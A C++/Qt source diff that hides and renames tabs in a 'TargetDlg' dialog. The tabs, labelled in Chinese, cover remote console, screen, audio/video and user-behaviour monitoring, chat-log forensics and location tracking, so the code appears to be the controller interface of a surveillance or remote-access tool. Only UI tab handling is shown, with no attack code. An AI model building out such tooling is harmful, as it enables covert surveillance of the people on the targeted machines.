@@ -129,11 +129,20 @@ TargetDlg::TargetDlg(Target* target)
 
 	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("地图定位")));
 	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("任务状态")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("远程控制台")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("录音信息")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("外部插件")));
 	//ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("日志记录")));
-	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("文件控制")), QString::fromLocal8Bit("文件浏览"));
-	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")), QString::fromLocal8Bit("敏感信息"));
-	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")), QString::fromLocal8Bit("屏幕截图"));
-	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")), QString::fromLocal8Bit("聊天记录"));
+	//ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("文件控制")), QString::fromLocal8Bit("文件浏览"));
+	//ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")), QString::fromLocal8Bit("敏感信息"));
+	//ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")), QString::fromLocal8Bit("屏幕截图"));
+	//ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")), QString::fromLocal8Bit("聊天记录"));
 
 	ui.lbMissionStatus->hide();
 
@@ -442,7 +451,7 @@ void TargetDlg::DispatchTabInit(int index)
 
 	std::map<std::wstring, INIT_FUNC> initMap;
 
-	initMap[L"文件浏览"] = &TargetDlg::InitFileCtrl;
+	initMap[L"文件控制"] = &TargetDlg::InitFileCtrl;
 	initMap[L"远程控制台"] = &TargetDlg::InitRemoteCmd;
 	initMap[L"任务状态"] = &TargetDlg::InitTaskStatus;
 	initMap[L"敏感信息"] = &TargetDlg::InitUserActionMonitor;
